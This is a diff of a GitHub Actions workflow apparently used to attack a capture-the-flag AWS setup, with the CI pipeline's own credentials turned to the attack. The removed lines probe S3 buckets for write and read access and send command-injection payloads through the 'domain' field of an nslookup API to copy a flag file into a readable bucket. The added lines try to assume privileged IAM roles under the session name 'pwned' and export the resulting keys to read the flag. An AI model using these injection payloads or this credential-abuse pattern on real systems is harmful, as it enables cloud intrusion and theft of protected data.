@@ -1,65 +1,23 @@
-name: deploy
-on:
-  push:
-    branches:
-      - corgi
-jobs:
-  aws:
-    runs-on: ubuntu-latest
-    permissions:
-      id-token: write
-      contents: read
-    steps:
-      - name: Get AWS credentials
-        uses: aws-actions/configure-aws-credentials@v4
-        with:
-          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
-          aws-region: us-east-1
-
-      - name: AWS identity
-        run: aws sts get-caller-identity
-
-      - name: Test PutObject on all buckets
+- name: Try assuming privileged roles
         run: |
-          echo "probe" > /tmp/probe.txt
-          aws s3 cp /tmp/probe.txt s3://site781fe43f26b9eba3/probe.txt && echo "PUT SITE: OK" || echo "PUT SITE: denied"
-          aws s3 cp /tmp/probe.txt s3://platform-bucket-009661764077-us-east-1/probe.txt && echo "PUT PLATFORM: OK" || echo "PUT PLATFORM: denied"
-          aws s3 cp /tmp/probe.txt s3://codec4f26c862a321ef5/probe.txt && echo "PUT CODEC: OK" || echo "PUT CODEC: denied"
+          echo "===== assume lambdaRole ====="
+          aws sts assume-role \
+            --role-arn arn:aws:iam::009661764077:role/lambdaRole \
+            --role-session-name pwned || echo "lambdaRole: denied"
+          echo "===== assume CTFExecutionRole ====="
+          aws sts assume-role \
+            --role-arn arn:aws:iam::009661764077:role/CTFExecutionRole \
+            --role-session-name pwned || echo "CTFExecutionRole: denied"
 
-      - name: Test GetObject on site and platform buckets
+      - name: If lambdaRole assumed - use its creds to read flag
         run: |
-          aws s3 cp s3://site781fe43f26b9eba3/index.html - && echo "GET SITE: OK" || echo "GET SITE: denied"
-          aws s3 cp s3://platform-bucket-009661764077-us-east-1/dotgit.zip /tmp/dotgit.zip && echo "GET PLATFORM: OK" || echo "GET PLATFORM: denied"
-
-      - name: Injection round 1 - find aws CLI path and write to site bucket
-        run: |
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";find /opt -name aws 2>/dev/null | head -5 > /tmp/out.txt; cat /tmp/out.txt; aws s3 cp /tmp/out.txt s3://site781fe43f26b9eba3/awspath.txt --region us-east-1 2>&1"}'
-          sleep 6
-
-      - name: Injection round 2 - try all known CLI paths to copy flag
-        run: |
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
-          sleep 3
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";/opt/aws/dist/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
-          sleep 3
-          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
-            -H "Content-Type: application/json" \
-            -d '{"domain":";/opt/awscli/aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://site781fe43f26b9eba3/flag.txt --region us-east-1 2>&1"}'
-          sleep 6
-
-      - name: Read everything back from site bucket
-        run: |
-          echo "===== list site bucket root ====="
-          aws s3 ls s3://site781fe43f26b9eba3/ || true
-          echo "===== awspath.txt ====="
-          aws s3 cp s3://site781fe43f26b9eba3/awspath.txt - || echo "not found"
-          echo "===== flag.txt ====="
-          aws s3 cp s3://site781fe43f26b9eba3/flag.txt - || echo "not found"
-          echo "===== probe.txt (confirms PUT worked) ====="
-          aws s3 cp s3://site781fe43f26b9eba3/probe.txt - || echo "not found"
+          CREDS=$(aws sts assume-role \
+            --role-arn arn:aws:iam::009661764077:role/lambdaRole \
+            --role-session-name pwned 2>/dev/null) || true
+          if [ -n "$CREDS" ]; then
+            export AWS_ACCESS_KEY_ID=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['AccessKeyId'])")
+            export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SecretAccessKey'])")
+            export AWS_SESSION_TOKEN=$(echo $CREDS | python3 -c "import sys,json; print(json.load(sys.stdin)['Credentials']['SessionToken'])")
+            echo "===== reading flag as lambdaRole ====="
+            aws s3 cp s3://codec4f26c862a321ef5/flag.txt -
+          fi
